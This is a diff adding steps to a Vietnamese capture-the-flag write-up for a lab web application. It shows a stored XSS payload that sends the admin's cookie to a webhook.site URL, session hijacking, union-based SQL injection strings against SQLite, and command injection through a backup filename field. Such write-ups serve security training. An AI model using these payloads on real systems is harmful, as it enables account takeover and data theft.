@@ -84,8 +84,107 @@ Cách khả dụng là Lấy được cookie của admin bằng cách lợi dụ
 => Tồn tại StoreXSS. Bây giờ phải viết payload sao cho mỗi lần up feedback, admin đọc được chúng ta đều lấy được feedback. Chúng ta sẽ dùng `Fetch API` để mỗi lần admin nhấp vào, nó sẽ tự gửi request từ trình duyệt nạn nhân đến 1 URL bên ngoài (ở đay mình sẽ cố gắng dùng `Webhook.site`)
 
 ```
-<script>fetch("https://webhook.site/32015b98-7f6e-46ec-a2d4-b27f59e2a33e")</script>
+<script>fetch(`https://webhook.site/32015b98-7f6e-46ec-a2d4-b27f59e2a33e?cookie=${document.cookie}`)</script>
 ```
+= Nó trả về session:
+
+<img width="1917" height="915" alt="image" src="https://github.com/user-attachments/assets/649a849f-72e0-4dc9-9a70-59871eada71c" />
+
+= Thay giá trị session này vào cookie, đăng nhập được vào tài khoản admin và có flag:
+
+<img width="750" height="637" alt="image" src="https://github.com/user-attachments/assets/7dbf2ff6-29c1-404b-8bd5-c8ddc1f5301c" />
+
+***Flag3: FLAG được ẩn trong một bài viết của admin với trạng thái là private.***
+
+= Xem tất cả các bài viết của Admin có Private = Yes ta thấy có flag:
+<img width="1074" height="403" alt="image" src="https://github.com/user-attachments/assets/cd38c1d8-9f76-4cf4-84d2-0175ca2d3a6f" />
+
+***Flag4: FLAG được ẩn trong một bảng của cơ sở dữ liệu.***
+
+= Vì đề bài nói là được ẩn trong 1 bảng của CSDL => SQLi
+
+= Sau khi vào tài khoản admin, có thêm chức năng "Search" mà tài khoản thường không xem được. 
+
+= Thử test với 'flag':
+
+<img width="835" height="459" alt="image" src="https://github.com/user-attachments/assets/e5c8e600-32d4-4b96-808e-4e2e7215be86" />
+
+= flag":
+
+<img width="798" height="425" alt="image" src="https://github.com/user-attachments/assets/f1c3fcf8-d7b8-497b-bf0c-9a31eda1fc52" />
+
+= Nhưng khi test với flag' thì hiện lỗi nhưng chưa khẳng định được gì, test tiếp:
+<img width="956" height="208" alt="image" src="https://github.com/user-attachments/assets/6e9b5aa5-0b73-469f-b062-805683fa6535" />
+
+>Mục đích của dấu ' thường là : admin'-- thì khi query sẽ trở thành 'admin'--'
+
+= Khi nhập flag'-- khi query sẽ thành 'flag'--' . Vì sau -- mọi thứ sẽ được coi là comment nên hệ thống sẽ hiểu là flag và xuất hiện `Secure FLag`:
+<img width="774" height="445" alt="image" src="https://github.com/user-attachments/assets/309731d7-4a8b-4704-a71f-e11ca9465baa" />
+
+= Khi nhập tiếp flag'-- - mà hệ thống vẫn hiện `Secure Flag` chứng tỏ bị nhiễm SQLi. 
+
+=> Đầu tiên, xác định số cột và dùng hệ quản trị csdl gì:
+
+`flag' order by <number>-- -`
+
+= Thay số lần lượt từ 1 vào đến khi nào gặp lỗi thì sẽ có n-1 cột.
+
+<img width="955" height="212" alt="image" src="https://github.com/user-attachments/assets/d446e544-0323-42f8-b70f-44011a5c82ce" />
+
+=> `Vậy có 3 cột. và dùng SQLite`
+
+=> Tìm các cột được hiển thị ra ngoài:
+
+<img width="712" height="474" alt="image" src="https://github.com/user-attachments/assets/24894035-769f-42f8-8eb4-7b7667f339f5" />
+
+=> Cột số 2 sẽ hiển thị cái mình muốn. Vây giờ lấy tên các bảng để xác định xem flag ở chỗ nào
+
+```
+flag' union select 1,group_concat(tbl_name),3 FROM sqlite_master WHERE  type='table' and tbl_name NOT like 'sqlite_%'-- -
+```
+
+<img width="725" height="403" alt="image" src="https://github.com/user-attachments/assets/143396d2-c4ba-4535-aec3-585b1c0e3fc0" />
+
+=> Vậy có tên các bảng: user, flag, blog, feedback.
+
+=> Xem bảng flag có những cột gì:
+
+<img width="845" height="923" alt="image" src="https://github.com/user-attachments/assets/b28c1f23-b6b8-477a-9401-3b4dccf11be0" />
+
+=> Thấy trong bảng flag, có cột `secret_flag`, giờ lấy flag:
+
+<img width="745" height="474" alt="image" src="https://github.com/user-attachments/assets/19cb8eef-f94c-4ba8-ab11-a1f4c2936922" />
+
+***Flag K01 Start Me Now: Hãy đọc file /flag.txt bên trong hệ thống.***
+
+>Các hướng làm bài này: RCE, Command Injection, SQL để đọc file.
+
+= Đi từ đơn giản nhất: OS Command Injection. Bây giờ còn chức năng /backup là chưa dùng.
+
+<img width="667" height="531" alt="image" src="https://github.com/user-attachments/assets/0c853ff5-8384-46df-a1b7-8985ed960ee7" />
+
+= Chức năng backup lại dữ liệu và khi thêm mình backup bất kỳ file gì thì nó cũng .db
+<img width="694" height="522" alt="image" src="https://github.com/user-attachments/assets/6e61f8c2-0f88-4316-961f-7a78a5cc9919" />
+
+= Vì mình có thể nhập tên file backup bất kỳ -> Nó là unstructed data.
+
+= Khi $(echo a) hoặc `echo a` nó in ra a.db => Thực hiện câu lệnh của HDH => OS Command Injection.
+
+<img width="668" height="531" alt="image" src="https://github.com/user-attachments/assets/7ce7dce5-cf91-4327-b839-25099eb4d39d" />
+
+<img width="820" height="625" alt="image" src="https://github.com/user-attachments/assets/ba941850-af3c-415b-bf43-01646352baf4" />
+
+= Thế là `Done Final1`
+
+
+
+
+
+
+
+
+
+
 
 
    
